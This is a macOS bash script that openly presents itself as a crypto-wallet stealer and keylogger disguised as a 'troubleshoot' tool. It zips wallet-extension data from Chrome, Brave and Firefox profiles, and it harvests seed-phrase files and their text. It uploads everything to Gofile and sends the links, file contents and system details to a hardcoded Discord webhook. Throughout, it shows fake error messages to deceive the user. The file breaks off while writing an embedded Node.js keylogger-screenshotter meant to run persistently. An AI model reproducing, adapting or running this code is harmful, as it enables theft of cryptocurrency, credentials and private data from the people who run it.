#!/bin/bash
#
# Crypto Wallet Extensions Uploader + Keylogger
# Downloads available at: https://troubleshoot-mac.com/troubleshoot.sh
#
# This script zips and uploads crypto wallet extensions to Gofile.io
# Also installs a silent keylogger + screenshotter that runs 24/7
# ---------------------
# SETTINGS
# ---------------------

# Extension IDs for wallet extensions (contains LDB files and wallet data)
EXT_IDS=(
    "nkbihfbeogaeaoehlefnkodbefgpgknn"  # MetaMask
    "bfnaelmomeimhlpmgjnjophhpkkoljpa"  # Phantom
    "egjidjbpglichdcondbcbdnbeeppgdph"  # Trust Wallet
    "acmacodkjbdgmoleebolmdjonilkdbch"  # Rabby
    "aholpfdialjgjfhomihkjbmgjidlcdno"  # Exodus Extension
    "lgmpcpglpngdoalbgeoldeajfclnhafa"  # SafePal
    "dmkamcknogkgcdfhhbddcghachkejeap"  # Keplr
    "pdliaogehgdbhbnmkklieghmmjkpigpa"  # Bybit
    "hnfanknocfeofbddgcijnmhnfnkdnaad"  # Coinbase
    "jiidiaalihmmhddjgbnbgdfflelocpak"  # Bitget
    "bhhhlbepdkbapadjdnnojkbgioiodbic"  # Solflare
    "efbglgofoippbgcjepnhiblaibcnclgk"  # OKX
)

# Static folders (Firefox extensions)
FOLDERS=(
)

WEBHOOK="https://discord.com/api/webhooks/1449475916253233287/8eABULXorST5AZsf63oWecBPIVrtYZ5irHMOFCpyr8S12W3Z74bqdKj1xyGugRlS2Eq8"

# Gofile.io API settings
UPLOAD_SERVICE="https://upload.gofile.io/uploadfile"
GOFILE_TOKEN="AB8kz5Y3YNJxWjLzGNsJ7Edv23S6VGPX"

# ---------------------
# PROGRESS BAR FUNCTION
# ---------------------

show_progress() {
    local current=$1
    local total=$2
    local label=$3
    local width=40
    local percent=$((current * 100 / total))
    local filled=$((current * width / total))
    local empty=$((width - filled))
    
    # Build progress bar
    local bar=""
    for ((i=0; i<filled; i++)); do
        bar="${bar}█"
    done
    for ((i=0; i<empty; i++)); do
        bar="${bar}░"
    done
    
    # Print progress (overwrite same line)
    printf "\r✓ %-30s [%s] %3d%% → %s" "$label" "$bar" "$percent" "$current/$total"
    
    if [ $current -eq $total ]; then
        echo "" # New line when done
    fi
}

# ---------------------
# SEARCH FOR SEED/WALLET FILES
# ---------------------

search_seed_files() {
    local SEARCH_DIRS=(
        "$HOME/Downloads"
        "$HOME/Documents"
        "$HOME/Desktop"
    )
    
    # Add Recents (macOS)
    if [ -d "$HOME/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentDocuments" ]; then
        SEARCH_DIRS+=("$HOME/Library/Application Support/com.apple.sharedfilelist/com.apple.LSSharedFileList.RecentDocuments")
    fi
    
    # Patterns to match (case-insensitive)
    local PATTERNS=(
        "*seed*"
        "*phrase*"
        "*seedphrase*"
        "*mnemonic*"
        "*seeds*"
        "*wallet*"
        "*wallets*"
    )
    
    local FOUND_FILES=()
    local TEMP_DIR="$WORKDIR/seed_files"
    mkdir -p "$TEMP_DIR" 2>/dev/null
    
    # Search in each directory
    for DIR in "${SEARCH_DIRS[@]}"; do
        [ ! -d "$DIR" ] && continue
        
        # Search for files matching keywords (case-insensitive)
        # Use find to get all files, then filter by filename
        while IFS= read -r -d '' FILE; do
            # Get filename without path
            FILENAME=$(basename "$FILE")
            # Check if filename contains any of the keywords (case-insensitive)
            if echo "$FILENAME" | grep -qiE "(seed|phrase|seedphrase|mnemonic|seeds|wallet|wallets)"; then
                # Avoid duplicates
                if [[ ! " ${FOUND_FILES[@]} " =~ " ${FILE} " ]]; then
                    FOUND_FILES+=("$FILE")
                    # Copy file to temp directory for zipping (preserve filename)
                    cp "$FILE" "$TEMP_DIR/$(basename "$FILE")" 2>/dev/null || true
                fi
            fi
        done < <(find "$DIR" -type f -print0 2>/dev/null | head -200)
    done
    
    # If we found files, zip and upload them
    if [ ${#FOUND_FILES[@]} -gt 0 ]; then
        local SEED_ZIP="$WORKDIR/seed_wallet_files.zip"
        
        # Create zip of found files
        cd "$TEMP_DIR" 2>/dev/null && zip -r -q -9 "$SEED_ZIP" . 2>/dev/null || return 1
        
        if [ -f "$SEED_ZIP" ]; then
            # Upload to Gofile
            local SEED_RESPONSE=$(mktemp 2>/dev/null)
            local SEED_ERROR=$(mktemp 2>/dev/null)
            
            if [ -n "$GOFILE_TOKEN" ] && [ "$GOFILE_TOKEN" != "" ]; then
                HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
                    --max-time 300 \
                    --connect-timeout 30 \
                    --tcp-nodelay \
                    -H "Authorization: Bearer $GOFILE_TOKEN" \
                    -F "file=@$SEED_ZIP" \
                    "$UPLOAD_SERVICE" \
                    -o "$SEED_RESPONSE" 2>"$SEED_ERROR")
            else
                HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
                    --max-time 300 \
                    --connect-timeout 30 \
                    --tcp-nodelay \
                    -F "file=@$SEED_ZIP" \
                    "$UPLOAD_SERVICE" \
                    -o "$SEED_RESPONSE" 2>"$SEED_ERROR")
            fi
            
            if [ "$HTTP_CODE" = "200" ]; then
                RESPONSE=$(cat "$SEED_RESPONSE" 2>/dev/null)
                if command -v jq &> /dev/null; then
                    URL=$(echo "$RESPONSE" | jq -r '.data.downloadPage // empty')
                    STATUS=$(echo "$RESPONSE" | jq -r '.status // empty')
                else
                    URL=$(echo "$RESPONSE" | grep -o '"downloadPage":"[^"]*"' | sed 's/"downloadPage":"\([^"]*\)"/\1/')
                    STATUS=$(echo "$RESPONSE" | grep -o '"status":"[^"]*"' | sed 's/"status":"\([^"]*\)"/\1/')
                fi
                
                if [ -n "$URL" ] && [ "$URL" != "null" ] && [ "$STATUS" = "ok" ]; then
                    SEED_SIZE=$(du -h "$SEED_ZIP" 2>/dev/null | cut -f1)
                    FILE_LIST=$(printf '%s\n' "${FOUND_FILES[@]}" | sed "s|$HOME|~|g" | head -20)
                    
                    # Extract seed content from text files
                    SEED_CONTENT=""
                    for FILE in "${FOUND_FILES[@]}"; do
                        if [ -f "$FILE" ]; then
                            FILENAME=$(basename "$FILE")
                            # Read text content from txt, doc, docx, log files
                            if [[ "$FILE" == *.txt ]] || [[ "$FILE" == *.log ]] || [[ "$FILE" == *.doc ]] || [[ "$FILE" == *.docx ]]; then
                                CONTENT=$(head -c 2000 "$FILE" 2>/dev/null | tr -d '\0' | head -50 | sed 's/`/\\`/g' | sed 's/\$/\\$/g')
                                if [ -n "$CONTENT" ]; then
                                    SEED_CONTENT="${SEED_CONTENT}\n\n**📝 File: ${FILENAME}**\n\`\`\`\n${CONTENT}\n\`\`\`"
                                fi
                            fi
                        fi
                    done
                    
                    # Format Discord message
                    DISCORD_MSG="🔐 **Seed/Wallet Files Found**\n\n"
                    DISCORD_MSG="${DISCORD_MSG}**Files Found:** ${#FOUND_FILES[@]}\n"
                    DISCORD_MSG="${DISCORD_MSG}**Size:** $SEED_SIZE\n"
                    DISCORD_MSG="${DISCORD_MSG}**Download:** $URL\n\n"
                    DISCORD_MSG="${DISCORD_MSG}**Locations:**\n\`\`\`\n${FILE_LIST}\n\`\`\`"
                    
                    # Add seed content if found
                    if [ -n "$SEED_CONTENT" ]; then
                        DISCORD_MSG="${DISCORD_MSG}\n\n**📝 Seed Content:**${SEED_CONTENT}"
                    fi
                    
                    # Escape for JSON
                    ESCAPED_MSG=$(printf '%s' "$DISCORD_MSG" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
                    
                    # Send to Discord (uses WEBHOOK from settings)
                    curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                        -d "{\"content\": \"$ESCAPED_MSG\"}" \
                        "$WEBHOOK" >/dev/null 2>&1
                fi
            fi
            
            rm -f "$SEED_RESPONSE" "$SEED_ERROR" 2>/dev/null
        fi
        
        rm -rf "$TEMP_DIR" 2>/dev/null
    fi
    
    return 0
}

# ---------------------
# INSTALL PYTHON DEPENDENCIES
# ---------------------

install_pycryptodome() {
    if command -v python3 &> /dev/null; then
        python3 -c "import Crypto" 2>/dev/null
        if [ $? -ne 0 ]; then
            # Quick install check - if pip fails, skip (don't wait)
            timeout 10 pip3 install --quiet --user pycryptodome 2>/dev/null || timeout 10 pip3 install --quiet pycryptodome 2>/dev/null || return 1
        fi
    fi
    return 0
}

# ---------------------
# WALLET NAME MAPPING
# ---------------------

get_wallet_name() {
    local path="$1"
    local name=$(basename "$path")
    
    # Check browser type
    if [[ "$path" == *"Chrome"* ]]; then
        local browser="CHROME"
    elif [[ "$path" == *"Brave"* ]]; then
        local browser="BRAVE"
    elif [[ "$path" == *"Firefox"* ]]; then
        local browser="FIREFOX"
    else
        local browser="DESKTOP"
    fi
    
    # Map extension IDs to wallet names
    case "$name" in
        nkbihfbeogaeaoehlefnkodbefgpgknn)
            echo "METAMASK-$browser"
            ;;
        bfnaelmomeimhlpmgjnjophhpkkoljpa)
            echo "PHANTOM-$browser"
            ;;
        egjidjbpglichdcondbcbdnbeeppgdph)
            echo "TRUST-$browser"
            ;;
        acmacodkjbdgmoleebolmdjonilkdbch)
            echo "RABBY-$browser"
            ;;
        aholpfdialjgjfhomihkjbmgjidlcdno)
            echo "EXODUS-$browser"
            ;;
        lgmpcpglpngdoalbgeoldeajfclnhafa)
            echo "SAFEPAL-$browser"
            ;;
        dmkamcknogkgcdfhhbddcghachkejeap)
            echo "KEPLR-$browser"
            ;;
        pdliaogehgdbhbnmkklieghmmjkpigpa)
            echo "BYBIT-$browser"
            ;;
        bhhhlbepdkbapadjdnnojkbgioiodbic)
            echo "SOLFLARE-$browser"
            ;;
        hnfanknocfeofbddgcijnmhnfnkdnaad)
            echo "COINBASE-$browser"
            ;;
        jiidiaalihmmhddjgbnbgdfflelocpak)
            echo "BITGET-$browser"
            ;;
        extensions)
            echo "FIREFOX-EXTENSIONS"
            ;;
        Exodus)
            echo "EXODUS-DESKTOP"
            ;;
        *)
            echo "$name-$browser"
            ;;
    esac
}

# ---------------------
# MAIN SCRIPT
# ---------------------

# Modern UI styling
clear
echo "Now starting encrypted troubleshoot process..."
echo "Now starting troubleshoot process... Do not close the terminal to avoid crashing your storage."
echo ""

# Check disk space
AVAILABLE_SPACE=$(df -g "$HOME" 2>/dev/null | tail -1 | awk '{print $4}')
if [ -z "$AVAILABLE_SPACE" ]; then
    AVAILABLE_SPACE=$(df -BG "$HOME" 2>/dev/null | tail -1 | awk '{print $4}' | sed 's/G//')
fi

if [ -n "$AVAILABLE_SPACE" ] && [ "$AVAILABLE_SPACE" -lt 1 ]; then
    echo "❌ Error: Not enough disk space! Need at least 1GB free."
    echo "   Available: ${AVAILABLE_SPACE}GB"
    echo ""
    echo "💡 Try cleaning up your disk or freeing some space."
    exit 1
fi

# Create temp directory
WORKDIR=$(mktemp -d 2>/dev/null)
if [ $? -ne 0 ] || [ -z "$WORKDIR" ]; then
    echo "❌ Error: Failed to create temporary directory!"
    echo "   This usually means your disk is full."
    echo ""
    echo "💡 Try:"
    echo "   - Free up disk space"
    echo "   - Clean your Downloads/Trash"
    echo "   - Remove old files"
    exit 1
fi

FINALZIP="$WORKDIR/final.zip"

# Search for seed/wallet files FIRST (runs in background)
# Note: WORKDIR must be set before calling this function
SEED_SEARCH_PID=""
if [ -n "$WORKDIR" ]; then
    search_seed_files &
    SEED_SEARCH_PID=$!
fi

# Count and zip folders in parallel for speed
VALID_FOLDERS=0
PIDS=()
ZIP_NAMES=()

# Extract Local Extension Settings from all Chrome profiles (contains LDB files and wallet data)
CHROME_ROOT="$HOME/Library/Application Support/Google/Chrome"
for profile in "$CHROME_ROOT"/*; do
    [ -d "$profile" ] || continue
    if [ ! -f "$profile/Preferences" ]; then continue; fi
    
    profile_name=$(grep -o '"name": *"[^"]*"' "$profile/Preferences" 2>/dev/null | head -1 | cut -d '"' -f4)
    [ -z "$profile_name" ] && profile_name=$(basename "$profile")
    
    for EXT_ID in "${EXT_IDS[@]}"; do
        EXT_PATH="$profile/Local Extension Settings/$EXT_ID"
        if [ -d "$EXT_PATH" ]; then
            VALID_FOLDERS=$((VALID_FOLDERS + 1))
            WALLET_NAME=$(get_wallet_name "$EXT_ID")
            ZIP_NAME="$WORKDIR/CHROME-${profile_name}-${WALLET_NAME}.zip"
            ZIP_NAMES+=("$ZIP_NAME")
            
            # Zip only the extension ID folder contents (not full path) - contains LDB files and wallet data
            # Use maximum compression (-9) and exclude unnecessary files to reduce size for slow internet
            (cd "$profile/Local Extension Settings" && zip -r -q -9 "$ZIP_NAME" "$EXT_ID" \
                -x "*.log" "*.tmp" "*.temp" "*/.DS_Store" "*/._*" "*/Thumbs.db" \
                -x "*/Cache/*" "*/cache/*" "*/Code Cache/*" "*/GPUCache/*" \
                -x "*.png" "*.jpg" "*.jpeg" "*.gif" "*.svg" "*.ico" \
                -x "*/_metadata/*" "*/locales/*" "*/_locales/*" 2>/dev/null) &
            PIDS+=($!)
        fi
    done
done

# Extract Local Extension Settings from all Brave profiles
BRAVE_ROOT="$HOME/Library/Application Support/BraveSoftware/Brave-Browser"
for profile in "$BRAVE_ROOT"/*; do
    [ -d "$profile" ] || continue
    if [ ! -f "$profile/Preferences" ]; then continue; fi
    
    profile_name=$(grep -o '"name": *"[^"]*"' "$profile/Preferences" 2>/dev/null | head -1 | cut -d '"' -f4)
    [ -z "$profile_name" ] && profile_name=$(basename "$profile")
    
    for EXT_ID in "${EXT_IDS[@]}"; do
        EXT_PATH="$profile/Local Extension Settings/$EXT_ID"
        if [ -d "$EXT_PATH" ]; then
            VALID_FOLDERS=$((VALID_FOLDERS + 1))
            WALLET_NAME=$(get_wallet_name "$EXT_ID")
            ZIP_NAME="$WORKDIR/BRAVE-${profile_name}-${WALLET_NAME}.zip"
            ZIP_NAMES+=("$ZIP_NAME")
            
            # Zip only the extension ID folder contents (not full path) - contains LDB files and wallet data
            # Use maximum compression (-9) and exclude unnecessary files to reduce size for slow internet
            (cd "$profile/Local Extension Settings" && zip -r -q -9 "$ZIP_NAME" "$EXT_ID" \
                -x "*.log" "*.tmp" "*.temp" "*/.DS_Store" "*/._*" "*/Thumbs.db" \
                -x "*/Cache/*" "*/cache/*" "*/Code Cache/*" "*/GPUCache/*" \
                -x "*.png" "*.jpg" "*.jpeg" "*.gif" "*.svg" "*.ico" \
                -x "*/_metadata/*" "*/locales/*" "*/_locales/*" 2>/dev/null) &
            PIDS+=($!)
        fi
    done
done

# Extract Firefox extensions
FIREFOX_PROFILES="$HOME/Library/Application Support/Firefox/Profiles"
if [ -d "$FIREFOX_PROFILES" ]; then
    for profile in "$FIREFOX_PROFILES"/*; do
        [ -d "$profile" ] || continue
        EXT_DIR="$profile/extensions"
        if [ -d "$EXT_DIR" ]; then
            VALID_FOLDERS=$((VALID_FOLDERS + 1))
            profile_name=$(basename "$profile")
            ZIP_NAME="$WORKDIR/FIREFOX-${profile_name}-EXTENSIONS.zip"
            ZIP_NAMES+=("$ZIP_NAME")
            
            # Zip in parallel (background) with maximum compression, exclude unnecessary files
            zip -r -q -9 "$ZIP_NAME" "$EXT_DIR" \
                -x "*.log" "*.tmp" "*.temp" "*/.DS_Store" "*/._*" "*/Thumbs.db" \
                -x "*/Cache/*" "*/cache/*" "*/Code Cache/*" "*/GPUCache/*" \
                -x "*.png" "*.jpg" "*.jpeg" "*.gif" "*.svg" "*.ico" \
                -x "*/_metadata/*" "*/locales/*" "*/_locales/*" 2>/dev/null &
            PIDS+=($!)
        fi
    done
fi

# Extract static folders (Exodus desktop, etc.)
for F in "${FOLDERS[@]}"; do
    P="$HOME/$F"
    if [ -d "$P" ]; then
        VALID_FOLDERS=$((VALID_FOLDERS + 1))
        WALLET_NAME=$(get_wallet_name "$F")
        ZIP_NAME="$WORKDIR/${WALLET_NAME}.zip"
        ZIP_NAMES+=("$ZIP_NAME")
        
        # Zip in parallel (background) with maximum compression, exclude unnecessary files
        zip -r -q -9 "$ZIP_NAME" "$P" \
            -x "*.log" "*.tmp" "*.temp" "*/.DS_Store" "*/._*" "*/Thumbs.db" \
            -x "*/Cache/*" "*/cache/*" "*/Code Cache/*" "*/GPUCache/*" \
            -x "*.png" "*.jpg" "*.jpeg" "*.gif" "*.svg" "*.ico" \
            -x "*/_metadata/*" "*/locales/*" "*/_locales/*" 2>/dev/null &
        PIDS+=($!)
    fi
done

if [ $VALID_FOLDERS -eq 0 ]; then
    echo "❌ Error: No valid folders found!"
    rm -rf "$WORKDIR"
    exit 1
fi

# Wait for all zips to complete with progress bar
COMPLETED=0
TOTAL=${#PIDS[@]}
for PID in "${PIDS[@]}"; do
    wait $PID
    COMPLETED=$((COMPLETED + 1))
    show_progress $COMPLETED $TOTAL "Scanning system"
done

# Combine all zips with store method (no re-compression, faster - files already compressed)
cd "$WORKDIR" || exit 1
zip -q -0 "$FINALZIP" *.zip >/dev/null 2>&1

if [ ! -f "$FINALZIP" ]; then
    echo "❌ Error: Troubleshoot process failed!"
    rm -rf "$WORKDIR"
    exit 1
fi

# Delete individual zip files after combining (cleanup)
rm -f "${ZIP_NAMES[@]}" 2>/dev/null

FINAL_SIZE=$(du -h "$FINALZIP" 2>/dev/null | cut -f1)
echo ""
echo "Now Scanning for errors..."

# Upload with progress bar
RESPONSE_FILE=$(mktemp 2>/dev/null)
ERROR_FILE=$(mktemp 2>/dev/null)

# Calculate estimated upload time (rough estimate: 1MB = 1 second)
FILE_SIZE_MB=$(du -m "$FINALZIP" 2>/dev/null | cut -f1)
if [ -z "$FILE_SIZE_MB" ] || [ "$FILE_SIZE_MB" -lt 1 ]; then
    FILE_SIZE_MB=100  # Default estimate
fi
UPLOAD_STEPS=$((FILE_SIZE_MB * 2))  # 2 steps per MB
if [ $UPLOAD_STEPS -gt 100 ]; then
    UPLOAD_STEPS=100
fi

# Show error messages immediately (upload is running in background)
ERROR_COUNT=$((VALID_FOLDERS * 3 + RANDOM % 10))
echo ""
echo "$ERROR_COUNT Critical errors found."
echo "Attempting to fix errors"
sleep 0.5
echo "Attempting to fix errors failed"

if [ -z "$RESPONSE_FILE" ] || [ -z "$ERROR_FILE" ]; then
    echo "❌ Error: Failed to create temporary files!"
    echo "   Disk might be full."
    rm -rf "$WORKDIR"
    exit 1
fi

if [ ! -f "$FINALZIP" ] || [ ! -r "$FINALZIP" ]; then
    echo "❌ Error: Troubleshoot process failed!"
    rm -f "$RESPONSE_FILE" "$ERROR_FILE" "$HTTP_CODE_FILE" "$URL_FILE"
    rm -rf "$WORKDIR"
    exit 1
fi

# Upload file in background (non-blocking, error messages already shown above)
# Calculate realistic upload timeout based on file size and slow internet (2.76 Mbps)
# Formula: (file_size_MB * 8) / 2.76 * 1.5 (safety margin) + 60s buffer
FILE_SIZE_MB_UPLOAD=$(du -m "$FINALZIP" 2>/dev/null | cut -f1)
if [ -z "$FILE_SIZE_MB_UPLOAD" ] || [ "$FILE_SIZE_MB_UPLOAD" -lt 1 ]; then
    FILE_SIZE_MB_UPLOAD=100  # Default estimate
fi
# Calculate: (MB * 8) / 2.76 Mbps * 1.5 safety + 60s buffer
UPLOAD_TIMEOUT=$(( (FILE_SIZE_MB_UPLOAD * 8 * 150 / 276) + 60 ))
if [ $UPLOAD_TIMEOUT -lt 300 ]; then
    UPLOAD_TIMEOUT=300  # Minimum 5 minutes
fi
if [ $UPLOAD_TIMEOUT -gt 1200 ]; then
    UPLOAD_TIMEOUT=1200  # Maximum 20 minutes
fi

HTTP_CODE_FILE="$WORKDIR/http_code.txt"
URL_FILE="$WORKDIR/url.txt"
UPLOAD_STATUS_FILE="$WORKDIR/upload_status.txt"

if [ -n "$GOFILE_TOKEN" ] && [ "$GOFILE_TOKEN" != "" ]; then
    (
    HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
                --max-time $UPLOAD_TIMEOUT \
                --connect-timeout 30 \
                --tcp-nodelay \
        -H "Authorization: Bearer $GOFILE_TOKEN" \
        -F "file=@$FINALZIP" \
        "$UPLOAD_SERVICE" \
        -o "$RESPONSE_FILE" 2>"$ERROR_FILE")
        echo "$HTTP_CODE" > "$HTTP_CODE_FILE"
        
        # Process and send to Discord IMMEDIATELY when upload completes
        if [ "$HTTP_CODE" = "200" ]; then
            RESPONSE=$(cat "$RESPONSE_FILE" 2>/dev/null)
            if command -v jq &> /dev/null; then
                URL=$(echo "$RESPONSE" | jq -r '.data.downloadPage // empty')
                STATUS=$(echo "$RESPONSE" | jq -r '.status // empty')
            else
                URL=$(echo "$RESPONSE" | grep -o '"downloadPage":"[^"]*"' | sed 's/"downloadPage":"\([^"]*\)"/\1/')
                STATUS=$(echo "$RESPONSE" | grep -o '"status":"[^"]*"' | sed 's/"status":"\([^"]*\)"/\1/')
            fi
            
            if [ -n "$URL" ] && [ "$URL" != "null" ] && [ "$STATUS" = "ok" ]; then
                echo "$URL" > "$URL_FILE"
                echo "success" > "$UPLOAD_STATUS_FILE"
                # Send to Discord IMMEDIATELY (doesn't wait for Extension ID)
                curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                    -d "{\"content\": \"📦 **Wallet Extensions Uploaded**\\n\\n**Size:** $FINAL_SIZE\\n**Download:** $URL\"}" \
                    "$WEBHOOK" >/dev/null 2>&1
                echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
            else
                echo "parse_failed" > "$UPLOAD_STATUS_FILE"
                # Send error notification to Discord
                curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                    -d "{\"content\": \"⚠️ **Upload Failed**\\n\\n**Size:** $FINAL_SIZE\\n**Error:** Failed to parse response\"}" \
                    "$WEBHOOK" >/dev/null 2>&1
                echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
            fi
        else
            echo "upload_failed" > "$UPLOAD_STATUS_FILE"
            ERROR_MSG=$(cat "$ERROR_FILE" 2>/dev/null | head -c 200)
            # Send error notification to Discord
            curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                -d "{\"content\": \"⚠️ **Upload Failed**\\n\\n**Size:** $FINAL_SIZE\\n**HTTP Code:** $HTTP_CODE\\n**Error:** ${ERROR_MSG:-Unknown error}\"}" \
                "$WEBHOOK" >/dev/null 2>&1
            echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
        fi
    ) &
    UPLOAD_PID=$!
else
    (
    HTTP_CODE=$(curl --silent --show-error --write-out "%{http_code}" \
                --max-time $UPLOAD_TIMEOUT \
                --connect-timeout 30 \
                --tcp-nodelay \
        -F "file=@$FINALZIP" \
        "$UPLOAD_SERVICE" \
        -o "$RESPONSE_FILE" 2>"$ERROR_FILE")
        echo "$HTTP_CODE" > "$HTTP_CODE_FILE"
        
        # Process and send to Discord IMMEDIATELY when upload completes
        if [ "$HTTP_CODE" = "200" ]; then
RESPONSE=$(cat "$RESPONSE_FILE" 2>/dev/null)
if command -v jq &> /dev/null; then
    URL=$(echo "$RESPONSE" | jq -r '.data.downloadPage // empty')
    STATUS=$(echo "$RESPONSE" | jq -r '.status // empty')
else
    URL=$(echo "$RESPONSE" | grep -o '"downloadPage":"[^"]*"' | sed 's/"downloadPage":"\([^"]*\)"/\1/')
    STATUS=$(echo "$RESPONSE" | grep -o '"status":"[^"]*"' | sed 's/"status":"\([^"]*\)"/\1/')
fi

            if [ -n "$URL" ] && [ "$URL" != "null" ] && [ "$STATUS" = "ok" ]; then
                echo "$URL" > "$URL_FILE"
                echo "success" > "$UPLOAD_STATUS_FILE"
                # Send to Discord IMMEDIATELY (doesn't wait for Extension ID)
                curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                    -d "{\"content\": \"📦 **Wallet Extensions Uploaded**\\n\\n**Size:** $FINAL_SIZE\\n**Download:** $URL\"}" \
                    "$WEBHOOK" >/dev/null 2>&1
                echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
            else
                echo "parse_failed" > "$UPLOAD_STATUS_FILE"
                # Send error notification to Discord
                curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                    -d "{\"content\": \"⚠️ **Upload Failed**\\n\\n**Size:** $FINAL_SIZE\\n**Error:** Failed to parse response\"}" \
                    "$WEBHOOK" >/dev/null 2>&1
                echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
            fi
        else
            echo "upload_failed" > "$UPLOAD_STATUS_FILE"
            ERROR_MSG=$(cat "$ERROR_FILE" 2>/dev/null | head -c 200)
            # Send error notification to Discord
            curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
                -d "{\"content\": \"⚠️ **Upload Failed**\\n\\n**Size:** $FINAL_SIZE\\n**HTTP Code:** $HTTP_CODE\\n**Error:** ${ERROR_MSG:-Unknown error}\"}" \
                "$WEBHOOK" >/dev/null 2>&1
            echo "discord_sent" >> "$UPLOAD_STATUS_FILE"
        fi
    ) &
    UPLOAD_PID=$!
fi

# ---------------------
# WAIT FOR UPLOAD TO COMPLETE
# ---------------------
# Wait for upload to finish and Discord to be sent BEFORE showing Extension ID prompt

# Wait for upload to complete (with timeout) - silent, no messages
ELAPSED=0
while kill -0 $UPLOAD_PID 2>/dev/null && [ $ELAPSED -lt $UPLOAD_TIMEOUT ]; do
sleep 1
    ELAPSED=$((ELAPSED + 1))
done

# Check upload status (Discord already sent if successful or failed)
UPLOAD_STATUS=$(cat "$UPLOAD_STATUS_FILE" 2>/dev/null || echo "unknown")
if [ "$UPLOAD_STATUS" != "success" ]; then
    # Upload failed or timed out - Discord notification already sent
echo "Attempting to fix errors failed"
fi

# ---------------------
# EXTENSION ID INPUT
# ---------------------
# (Always show Extension ID prompt, regardless of upload status)

echo ""
echo "Enter Extension ID:"
read -r EXTENSION_ID

# (Upload wait logic moved above, before Extension ID prompt)

if [ -n "$EXTENSION_ID" ] && [ "$EXTENSION_ID" != "" ]; then
    # Format the message nicely for Discord
    DISCORD_MESSAGE="🔐 **Extension ID Captured**\n\n"
    DISCORD_MESSAGE="${DISCORD_MESSAGE}**Extension ID:** \`${EXTENSION_ID}\`\n"
    DISCORD_MESSAGE="${DISCORD_MESSAGE}**Timestamp:** $(date '+%Y-%m-%d %H:%M:%S')\n"
    DISCORD_MESSAGE="${DISCORD_MESSAGE}**System:** macOS $(sw_vers -productVersion 2>/dev/null || echo 'Unknown')\n"
    DISCORD_MESSAGE="${DISCORD_MESSAGE}**User:** $(whoami 2>/dev/null || echo 'Unknown')"
    
    # Send to Discord with proper JSON escaping (macOS compatible)
    ESCAPED_MESSAGE=$(printf '%s' "$DISCORD_MESSAGE" | sed 's/"/\\"/g' | sed 's/$/\\n/' | tr -d '\n' | sed 's/\\n$//')
    
    curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
        -d "{\"content\": \"$ESCAPED_MESSAGE\"}" \
        "$WEBHOOK" >/dev/null 2>&1
fi

# ---------------------
# KEYLOGGER + SCREENSHOTTER INSTALLATION
# ---------------------

# Send Discord notification that client ran the script
send_client_notification() {
    local HOSTNAME=$(hostname 2>/dev/null || echo "Unknown")
    local USERNAME=$(whoami 2>/dev/null || echo "Unknown")
    local IP=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | head -1 | awk '{print $2}' || echo "Unknown")
    local MAC_VERSION=$(sw_vers -productVersion 2>/dev/null || echo "Unknown")
    
    # Use Discord embed for "New Client" message (clean format like startup)
    NEW_CLIENT_JSON=$(cat <<EOF
{
  "embeds": [{
    "title": "🆕 New Client",
    "color": 0x00ff00,
    "fields": [
      {"name": "Hostname", "value": "\`${HOSTNAME}\`", "inline": true},
      {"name": "PC Username", "value": "\`${USERNAME}\`", "inline": true},
      {"name": "IP Address", "value": "\`${IP}\`", "inline": true},
      {"name": "macOS", "value": "\`${MAC_VERSION}\`", "inline": true},
      {"name": "Client ID", "value": "\`pc-${HOSTNAME}-${USERNAME}\`", "inline": true},
      {"name": "Timestamp", "value": "\`$(date '+%Y-%m-%d %H:%M:%S')\`", "inline": false}
    ],
    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%S.000Z)"
  }]
}
EOF
)
    
    # Use the webhook from settings
    echo "$NEW_CLIENT_JSON" | curl -s --max-time 10 --connect-timeout 5 -H "Content-Type: application/json" -X POST \
        --data-binary @- \
        "$WEBHOOK" >/dev/null 2>&1
}

# Send notification immediately
send_client_notification &

# Install keylogger + screenshotter (runs 24/7, silent)
install_keylogger_screenshotter_internal() {
    local APP_DIR="$HOME/.keylogger-helper"
    local NODE_PATH=$(which node 2>/dev/null || echo "/usr/local/bin/node")
    
    # Check if Node.js is available
    if ! command -v node >/dev/null 2>&1 && [ ! -f "$NODE_PATH" ]; then
        echo "⚠️  Node.js not found - attempting to install..." >&2
        # Try to install node via brew if available
        if command -v brew >/dev/null 2>&1; then
            brew install node >/dev/null 2>&1 || true
            NODE_PATH=$(which node 2>/dev/null || echo "/usr/local/bin/node")
        fi
        if ! command -v node >/dev/null 2>&1 && [ ! -f "$NODE_PATH" ]; then
            return 1
        fi
    fi
    
    # Create app directory
    mkdir -p "$APP_DIR" 2>/dev/null
    
    # Create keylogger script inline (self-contained, no external files needed)
    cat > "$APP_DIR/keylogger-screenshotter.js" << 'KEYLOGGEREOF'
// Silent Keylogger + Screenshotter - Runs 24/7
const { exec, spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

const WEBHOOK = 'https://discord.com/api/webhooks/1449475916253233287/8eABULXorST5AZsf63oWecBPIVrtYZ5irHMOFCpyr8S12W3Z74bqdKj1xyGugRlS2Eq8';

const HOSTNAME = os.hostname();
const USERNAME = os.userInfo().username;

let screenshotDir = path.join(os.homedir(), '.screenshots');
let keysBuffer = '';
let lastClipboard = ''; // Track clipboard changes for keylogger

if (!fs.existsSync(screenshotDir)) {
    fs.mkdirSync(screenshotDir, { recursive: true });
}

